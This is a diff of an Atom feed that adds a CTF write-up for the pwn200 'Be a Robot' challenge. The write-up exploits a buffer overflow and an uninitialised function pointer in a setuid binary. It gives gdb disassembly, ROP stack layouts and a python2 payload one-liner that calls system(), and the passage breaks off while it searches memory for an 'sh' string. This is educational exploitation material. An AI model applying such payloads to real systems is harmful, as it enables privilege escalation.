@@ -1,5 +1,264 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Krebs CTF Writeups</title><link href="http://krebsco.de/" rel="alternate"></link><link href="http://krebsco.de/feeds/makefu.atom.xml" rel="self"></link><id>http://krebsco.de/</id><updated>2014-07-21T00:00:00+02:00</updated><entry><title>ROT</title><link href="http://krebsco.de/rot.html" rel="alternate"></link><updated>2014-07-21T00:00:00+02:00</updated><author><name>makefu</name></author><id>tag:krebsco.de,2014-07-21:rot.html</id><summary type="html">&lt;ul&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Krebs CTF Writeups</title><link href="http://krebsco.de/" rel="alternate"></link><link href="http://krebsco.de/feeds/makefu.atom.xml" rel="self"></link><id>http://krebsco.de/</id><updated>2014-07-30T00:00:00+02:00</updated><entry><title>Be a Robot</title><link href="http://krebsco.de/be-a-robot.html" rel="alternate"></link><updated>2014-07-30T00:00:00+02:00</updated><author><name>makefu</name></author><id>tag:krebsco.de,2014-07-30:be-a-robot.html</id><summary type="html">&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Author&lt;/strong&gt;: makefu&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Intro&lt;/h2&gt;
+&lt;p&gt;First of all, this is a post-mortem solution for pwn200 as we failed to finish
+it within ctf time both because the challenge was offline alot of the time and
+that we were not experienced enough to find a solution.&lt;/p&gt;
+&lt;p&gt;The challenge was to elevate privileges on a remote server to a user which was
+able to read the file $HOME/flag . The folder also contained a file named
+pwn200 which had suid bit set for the user -&amp;gt; pop a shell by finding a vuln in
+this program.&lt;/p&gt;
+&lt;h2&gt;Track the Vuln&lt;/h2&gt;
+&lt;p&gt;Running the program looks like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pwn200 
+Name: Bob
+Age: 10
+Goodbye little boy
+
+&lt;span class="nv"&gt;$ &lt;/span&gt;./pwn200
+Name: Khan
+Age: -1
+&lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;]&lt;/span&gt;    6141 segmentation fault  ./pwn200
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When supplying a negative age &lt;code&gt;eax&lt;/code&gt; will not be updated in the function atExit
+and the pointer will stay uninitialized. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="failed check in atExit" src="data/be_a_robot/atExit.png" /&gt;&lt;/p&gt;
+&lt;p&gt;The fgets which reads the name contains a buffer overflow which allows us to override exactly this pointer.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="bof in read_user" src="data/be_a_robot/read_user.png" /&gt;&lt;/p&gt;
+&lt;p&gt;Trying it in gdb looks like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;br&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mh"&gt;0x8048670&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nx"&gt;call&lt;/span&gt; &lt;span class="nx"&gt;eax&lt;/span&gt;
+&lt;span class="nx"&gt;Breakpoint&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="nx"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x8048670&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;r&lt;/span&gt;
+&lt;span class="nx"&gt;Starting&lt;/span&gt; &lt;span class="nx"&gt;program&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="err"&gt;/home/makefu/pwnium/200/pwn200 &lt;/span&gt;
+&lt;span class="nx"&gt;warning&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Could&lt;/span&gt; &lt;span class="nx"&gt;not&lt;/span&gt; &lt;span class="nx"&gt;load&lt;/span&gt; &lt;span class="nx"&gt;shared&lt;/span&gt; &lt;span class="nx"&gt;library&lt;/span&gt; &lt;span class="nx"&gt;symbols&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nx"&gt;linux&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;gate&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;so&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="nx"&gt;Do&lt;/span&gt; &lt;span class="nx"&gt;you&lt;/span&gt; &lt;span class="nx"&gt;need&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;set solib-search-path&amp;quot;&lt;/span&gt; &lt;span class="nx"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;set sysroot&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;
+&lt;span class="nx"&gt;Name&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/span&gt;
+
+&lt;span class="nx"&gt;Breakpoint&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x08048670&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;atExit&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;disass&lt;/span&gt; 
+&lt;span class="nx"&gt;Dump&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;assembler&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;atExit&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+  &lt;span class="mh"&gt;0x08048660&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;cmp&lt;/span&gt;    &lt;span class="nx"&gt;DWORD&lt;/span&gt; &lt;span class="nx"&gt;PTR&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x8&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;
+  &lt;span class="mh"&gt;0x08048664&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;jle&lt;/span&gt;    &lt;span class="mh"&gt;0x804866d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;atExit&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class="mh"&gt;0x08048666&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="nx"&gt;DWORD&lt;/span&gt; &lt;span class="nx"&gt;PTR&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0xc&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x804860c&lt;/span&gt;
+  &lt;span class="mh"&gt;0x0804866d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="nx"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;DWORD&lt;/span&gt; &lt;span class="nx"&gt;PTR&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0xc&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x08048670&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;52&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;call&lt;/span&gt;   &lt;span class="nx"&gt;eax&lt;/span&gt;
+  &lt;span class="mh"&gt;0x08048672&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;54&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;leave&lt;/span&gt;  
+  &lt;span class="mh"&gt;0x08048673&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;55&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;ret&lt;/span&gt;    
+&lt;span class="nx"&gt;End&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;assembler&lt;/span&gt; &lt;span class="nx"&gt;dump&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="nx"&gt;r&lt;/span&gt; &lt;span class="nx"&gt;eax&lt;/span&gt;
+&lt;span class="nx"&gt;eax&lt;/span&gt;            &lt;span class="mh"&gt;0x41414141&lt;/span&gt; &lt;span class="mi"&gt;1094795585&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Prepare the stack for ROP&lt;/h2&gt;
+&lt;p&gt;We cannot directly execute our name string as both ASLR and NX-Stack are enabled but there is a system call in a unused function called &lt;code&gt;test&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;disassemble&lt;/span&gt; &lt;span class="nx"&gt;test&lt;/span&gt;
+&lt;span class="nx"&gt;Dump&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;assembler&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;test&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+  &lt;span class="mh"&gt;0x08048694&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt; &lt;span class="nx"&gt;push&lt;/span&gt;   &lt;span class="nx"&gt;ebp&lt;/span&gt;
+  &lt;span class="mh"&gt;0x08048695&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt; &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="nx"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;
+  &lt;span class="mh"&gt;0x08048697&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt; &lt;span class="nx"&gt;sub&lt;/span&gt;    &lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x8&lt;/span&gt;
+  &lt;span class="mh"&gt;0x0804869a&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt; &lt;span class="nx"&gt;sub&lt;/span&gt;    &lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0xc&lt;/span&gt;
+  &lt;span class="mh"&gt;0x0804869d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt; &lt;span class="nx"&gt;push&lt;/span&gt;   &lt;span class="mh"&gt;0x80487f3&lt;/span&gt;
+  &lt;span class="mh"&gt;0x080486a2&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;call&lt;/span&gt;   &lt;span class="mh"&gt;0x8048430&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;system&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class="mh"&gt;0x080486a7&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;add&lt;/span&gt;    &lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;
+  &lt;span class="mh"&gt;0x080486aa&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;leave&lt;/span&gt;  
+  &lt;span class="mh"&gt;0x080486ab&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;  &lt;span class="nx"&gt;ret&lt;/span&gt;    
+&lt;span class="nx"&gt;End&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;assembler&lt;/span&gt; &lt;span class="nx"&gt;dump&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Too bad we cannot directly prepare the stack with our provided text to supply a string which then can be executed. 
+To be clear: we currently only control eip, not the whole stack. ROP to the rescue!&lt;/p&gt;
+&lt;p&gt;This is how our stack must look like for a successful exploit:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Address&lt;/th&gt;
+&lt;th align="right"&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;call system&lt;/td&gt;
+&lt;td align="right"&gt;&amp;lt;- esp&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;[command-string]&lt;/td&gt;
+&lt;td align="right"&gt;&amp;lt;- esp + 4 (first argument)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;The ROP gadget i used is a simple 'pop-ret' which can be found with for example &lt;a href="http://shell-storm.org/project/ROPgadget/"&gt;msfrop&lt;/a&gt; or &lt;a href="http://shell-storm.org/project/ROPgadget/"&gt;ROPgadget&lt;/a&gt;. POP-RET is at &lt;code&gt;0x080487a6&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;By that we can prepare our input as an argument for the system call. As we have no shell command yet we will used &lt;code&gt;0x80487f3&lt;/code&gt; - 'echo pwned' for testing.&lt;/p&gt;
+&lt;h3&gt;Follow the Execution Flow&lt;/h3&gt;
+&lt;p&gt;These tables show the stack after each ROP step.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Before call ROP&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align="left"&gt;Address&lt;/th&gt;
+&lt;th align="center"&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;[A*36]&lt;/td&gt;
+&lt;td align="center"&gt;BOF Filler&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;[AAAA]&lt;/td&gt;
+&lt;td align="center"&gt;BOF Filler&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080486a2 &lt;code&gt;esp&lt;/code&gt;&lt;/td&gt;
+&lt;td align="center"&gt;call system&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080487f3&lt;/td&gt;
+&lt;td align="center"&gt;"echo hacked"&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;[BBBB]&lt;/td&gt;
+&lt;td align="center"&gt;Filler&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080487a6 &lt;code&gt;eip&lt;/code&gt;&lt;/td&gt;
+&lt;td align="center"&gt;pop ebx;ret&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;After ret from pop-ret ROP Gadget&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align="left"&gt;Address&lt;/th&gt;
+&lt;th align="center"&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;[A*32]&lt;/td&gt;
+&lt;td align="center"&gt;BOF Filler&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x08048672&lt;/td&gt;
+&lt;td align="center"&gt;ret addr call-eax&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080486a2&lt;/td&gt;
+&lt;td align="center"&gt;call system&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080487f3 &lt;code&gt;esp&lt;/code&gt;&lt;/td&gt;
+&lt;td align="center"&gt;"echo hacked"&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;[BBBB]&lt;/td&gt;
+&lt;td align="center"&gt;Filler&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080487a6&lt;/td&gt;
+&lt;td align="center"&gt;pop ebx;ret&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;After call system&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align="left"&gt;Address&lt;/th&gt;
+&lt;th align="center"&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;[A*32]&lt;/td&gt;
+&lt;td align="center"&gt;BOF Filler&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x08048672&lt;/td&gt;
+&lt;td align="center"&gt;ret addr call-eax&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080486a2 &lt;code&gt;esp&lt;/code&gt;&lt;/td&gt;
+&lt;td align="center"&gt;ret addr call-system&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080487f3 &lt;code&gt;parm1&lt;/code&gt;&lt;/td&gt;
+&lt;td align="center"&gt;"echo hacked"&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;[BBBB]&lt;/td&gt;
+&lt;td align="center"&gt;Filler&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align="left"&gt;0x080487a6&lt;/td&gt;
+&lt;td align="center"&gt;pop ebx;ret&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;Quick Sidenote:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;call address&lt;/code&gt; pushes the return address($eip+sizeof(call)) onto the stack and executes the function at  &lt;strong&gt;address&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;ret&lt;/em&gt; pops the return address from the stack and executes the address&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The payload generation and testing looks like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;python2 -c &lt;span class="s1"&gt;&amp;#39;print(&amp;quot;A&amp;quot;*36+&amp;quot;\xa2\x86\x04\x08&amp;quot;+&amp;quot;\x01\x8c\x04\x08&amp;quot;+&amp;quot;BBBB&amp;quot;+ &amp;quot;\xa6\x87\x04\x08&amp;quot;+&amp;quot;CCCC&amp;quot;+&amp;quot;DDDD&amp;quot;+ &amp;quot;EEE\n&amp;quot; +&amp;quot;-1&amp;quot;)&amp;#39;&lt;/span&gt;  &amp;gt; in
+gdb ./pwn200
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; r &amp;lt; in
+Starting program: ./pwn200 &amp;lt; in
+hacked
+Name: Age: &lt;span class="o"&gt;[&lt;/span&gt;Inferior 1 &lt;span class="o"&gt;(&lt;/span&gt;process 11968&lt;span class="o"&gt;)&lt;/span&gt; exited normally&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Find the exec string&lt;/h3&gt;
+&lt;p&gt;We need a string address for system argument which allows us to run whatever commands we want. Due to the fact aslr is enabled hitting our 36 bytes short buffer is kind of unlikely. Using environment variables with &lt;code&gt;" "\*9001 +"/bin/sh"&lt;/code&gt; may give us a better chance to guess the address but is still pretty crude.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;"sh"&lt;/code&gt; which is short and gives us full access may reside in the executable after being loaded in the memory so i gave it a shot with gdb:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;break&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;
+&lt;span class="n"&gt;Breakpoint&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x8048701A&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;info&lt;/span&gt; &lt;span class="n"&gt;proc&lt;/span&gt; &lt;span class="n"&gt;mappings&lt;/span&gt;
+&lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;11324&lt;/span&gt;
+&lt;span class="n"&gt;Mapped&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;spaces&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+
+  &lt;span class="n"&gt;Start&lt;/span&gt; &lt;span class="n"&gt;Addr&lt;/span&gt;   &lt;span class="n"&gt;End&lt;/span&gt; &lt;span class="n"&gt;Addr&lt;/span&gt;       &lt;span class="n"&gt;Size&lt;/span&gt;     &lt;span class="n"&gt;Offset&lt;/span&gt; &lt;span class="n"&gt;objfile&lt;/span&gt;
+  &lt;span class="mh"&gt;0x8048000&lt;/span&gt;  &lt;span class="mh"&gt;0x8049000&lt;/span&gt;     &lt;span class="mh"&gt;0x1000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;makefu&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pwnium&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pwn200&lt;/span&gt;
+  &lt;span class="mh"&gt;0x8049000&lt;/span&gt;  &lt;span class="mh"&gt;0x804a000&lt;/span&gt;     &lt;span class="mh"&gt;0x1000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;makefu&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pwnium&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pwn200&lt;/span&gt;
+  &lt;span class="mh"&gt;0xf7564000&lt;/span&gt; &lt;span class="mh"&gt;0xf7565000&lt;/span&gt;     &lt;span class="mh"&gt;0x1000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; 
+  &lt;span class="mh"&gt;0xf7565000&lt;/span&gt; &lt;span class="mh"&gt;0xf7720000&lt;/span&gt;   &lt;span class="mh"&gt;0x1bb000&lt;/span&gt;        &lt;span class="mh"&gt;0x0&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib32&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2.19&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
+  &lt;span class="mh"&gt;0xf7720000&lt;/span&gt; &lt;span class="mh"&gt;0xf7723000&lt;/span&gt;     &lt;span class="mh"&gt;0x3000&lt;/span&gt;   &lt;span class="mh"&gt;0x1ba000&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib32&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;2.19&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
